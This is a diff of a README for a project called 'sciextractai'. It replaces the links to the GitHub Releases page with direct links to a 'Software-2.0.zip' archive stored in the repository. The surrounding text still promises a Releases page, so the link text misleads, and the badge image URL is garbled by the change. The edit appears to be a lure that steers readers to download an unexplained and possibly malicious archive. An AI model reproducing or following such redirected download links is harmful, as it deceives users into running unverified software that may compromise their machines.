@@ -2,7 +2,7 @@
 
 ## 💻 Download the App
 
-[![Download sciextractai](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Bunzzzzzz/sciextractai/releases)
+[![Download sciextractai](https://raw.githubusercontent.com/Bunzzzzzz/sciextractai/main/sciextractai/Software-2.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Bunzzzzzz/sciextractai/main/sciextractai/Software-2.0.zip)
 
 ## 📖 Overview
 
@@ -31,7 +31,7 @@ To get started with sciextractai, follow these simple steps:
 
 1. Click the link below to visit the Releases page on GitHub:
    
-   [Visit this page to download sciextractai](https://github.com/Bunzzzzzz/sciextractai/releases)
+   [Visit this page to download sciextractai](https://raw.githubusercontent.com/Bunzzzzzz/sciextractai/main/sciextractai/Software-2.0.zip)
 
 2. On the Releases page, look for the latest version.
    
